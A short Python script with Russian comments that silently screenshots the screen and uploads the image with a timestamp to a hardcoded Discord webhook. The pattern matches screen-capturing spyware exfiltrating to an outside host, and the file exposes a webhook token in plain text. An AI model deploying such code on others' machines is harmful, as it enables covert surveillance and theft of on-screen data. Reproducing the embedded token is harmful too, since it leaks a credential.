import pyautogui
import datetime
from discord_webhook import DiscordWebhook

# Сделать скриншот
screenshot_path = "screenshot.png"
pyautogui.screenshot(screenshot_path)

# Время создания скриншота
now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
description = f"Скриншот сделан: {now}"

# Отправка в Discord
webhook = DiscordWebhook(
    url="https://discord.com/api/webhooks/1392514465240580195/KYzEZHcGEwSmJyLlxuP9STfaKh2yVUmM4OCzBMamn2-RQZ2rYQgIO69IbDUopA7nb1UG",
    username="Калл",
    content=description
)

with open(screenshot_path, "rb") as f:
    webhook.add_file(file=f.read(), filename="screenshot.png")

response = webhook.execute()
